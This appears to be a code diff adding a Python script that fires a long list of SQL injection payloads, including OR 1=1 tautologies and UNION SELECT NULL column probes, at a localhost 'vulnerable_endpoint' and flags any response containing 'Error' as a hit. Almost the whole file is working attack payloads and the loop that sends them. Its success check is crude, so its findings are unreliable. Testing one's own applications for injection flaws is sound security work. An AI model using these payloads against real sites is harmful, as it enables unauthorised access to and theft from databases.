@@ -1,0 +1,26 @@
+import requests
+
+# URL of the vulnerable web server
+url = "http://localhost/vulnerable_endpoint"
+
+def check_sql_injection(payload):
+    # Send an API request with the payload
+    response = requests.get(url + "?id=" + payload)
+
+    # Check if the SQL injection was successful
+    if "Error" in response.text:
+        return True
+    else:
+        return False
+
+def analyze_sql_injection():
+    # List of payloads to test for SQL injection
+    payloads = ["1' OR '1'='1' --", "1' OR '1'='1' /", "1 OR 1=1", "1 OR 1=1--", "1 OR 1=1/", "1' OR '1'='1' --", "1' OR '1'='1' /", "1' OR '1'='1' #", "' OR 'x'='x", "' OR 'x'='x' --", "' OR 'x'='x' /", "' OR 'x'='x' #", "') OR ('x'='x", "') OR ('x'='x' --", "') OR ('x'='x' /", "') OR ('x'='x' #", "1 OR 1=1;", "1 OR 1=1;--", "1 OR 1=1;/", "1 OR 1=1;#", "') OR ('x'='x';", "') OR ('x'='x';--", "') OR ('x'='x';/*", "') OR ('x'='x';#", "1' OR '1'='1' UNION SELECT NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--", "1' OR '1'='1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--"]
+
+    for payload in payloads:
+        is_vulnerable = check_sql_injection(payload)
+        if is_vulnerable:
+            print("SQL Injection vulnerability detected! Payload:", payload)
+            # Perform further analysis or take appropriate action
+
+analyze_sql_injection()
